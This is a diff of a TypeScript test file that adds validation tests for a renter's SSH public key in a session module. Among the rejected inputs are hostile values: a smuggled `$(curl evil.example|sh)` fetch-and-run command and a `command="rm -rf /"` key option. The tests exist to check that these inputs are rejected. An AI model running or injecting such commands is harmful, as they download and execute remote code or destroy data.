@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { checkRequest, findPaymentFor, isOwner, parseRunInput, secretFor, walletReady } from "./session";
+import { checkRequest, findPaymentFor, isOwner, parseRunInput, secretFor, walletReady, sshPublicKeyOf } from "./session";
 
 const good = {
   market: "test",
@@ -14,7 +14,31 @@ const req = (headers: Record<string, string>) => new Request("http://127.0.0.1:3
 describe("parseRunInput", () => {
   it("accepts the brief's example run", () => {
     const r = parseRunInput(good);
-    expect(r).toEqual({ ok: true, value: { market: "test", need: good.need, limits: { budgetUsd: 1, rateUsdHr: 0.05 }, askBeforePaying: true, wallet: null } });
+    expect(r).toEqual({ ok: true, value: { market: "test", need: good.need, limits: { budgetUsd: 1, rateUsdHr: 0.05 }, askBeforePaying: true, wallet: null, sshPublicKey: null } });
+  });
+
+  it("takes the renter's own SSH public key, one line, and never anything else", () => {
+    const ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq0m0b1x0u2r3n4t5e6s7t8k9e0y1a2b3c4d5e6f7g8h9 me@laptop";
+    expect(parseRunInput({ ...good, sshPublicKey: `  ${ed}\n` })).toMatchObject({ ok: true, value: { sshPublicKey: ed } });
+    expect(parseRunInput({ ...good })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
+    expect(parseRunInput({ ...good, sshPublicKey: "" })).toMatchObject({ ok: true, value: { sshPublicKey: null } });
+    expect(sshPublicKeyOf(`ssh-rsa ${"A".repeat(372)}`)).not.toBeNull();
+    expect(sshPublicKeyOf(`ecdsa-sha2-nistp256 ${"A".repeat(140)}= key`)).not.toBeNull();
+    const bad = [
+      "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----",
+      `${ed}\nssh-ed25519 AAAAsecondline`,
+      "ssh-ed25519 short",
+      `ssh-dss ${"A".repeat(100)}`,
+      `ssh-ed25519 ${"A".repeat(80)} $(curl evil.example|sh) ${"x".repeat(90)}`,
+      `ssh-ed25519 ${"A".repeat(1400)}`,
+      "command=\"rm -rf /\" ssh-ed25519 " + "A".repeat(68),
+      42,
+      {},
+    ];
+    for (const v of bad) {
+      expect(sshPublicKeyOf(v)).toBeNull();
+      expect(parseRunInput({ ...good, sshPublicKey: v }).ok).toBe(false);
+    }
   });
 
   it("takes a connected wallet to pay from, and then always asks before paying", () => {
